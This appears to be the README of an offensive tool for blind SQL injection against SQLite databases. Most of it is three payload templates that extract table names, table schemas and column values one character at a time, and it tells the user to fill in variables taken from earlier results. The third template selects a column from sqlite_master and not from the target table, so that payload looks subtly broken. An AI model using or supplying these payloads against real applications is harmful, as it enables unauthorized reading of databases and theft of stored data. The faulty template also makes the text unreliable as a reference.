__________SQLiteBLINDInjection__________
Blind SQL Injection For SQLite Databases

https://github.com/aykutcanustun
Author: aykutcanustun

How to set queries:
__________________________________________________________________________________________________________
To retrieve table names from database, use this one:
' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {} --

To retrieve table schema, use this one:
' or UNICODE(SUBSTR((SELECT sql FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --

To retrieve values inside column, use this one:
' or UNICODE(SUBSTR((SELECT $COLUMN_NAME FROM sqlite_master WHERE tbl_name='$TABLE_NAME'),{},1)){} {} --

Replace $TABLE_NAME, $COLUMN_NAME with data that you retrieved from privious one!
___________________________________________________________________________________________________________

For using script, you have to set varibles manually!
